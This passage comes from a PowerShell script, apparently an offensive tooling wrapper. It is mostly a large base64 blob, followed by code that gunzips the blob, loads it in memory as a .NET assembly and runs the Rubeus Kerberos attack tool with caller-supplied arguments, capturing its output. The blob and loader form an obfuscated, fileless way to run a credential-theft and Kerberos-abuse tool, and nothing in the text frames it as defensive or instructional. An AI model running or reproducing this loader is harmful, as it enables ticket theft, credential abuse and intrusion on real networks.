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"))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)

    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [Rubeus.Program]::main([string[]]$args)

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
  
}
'@
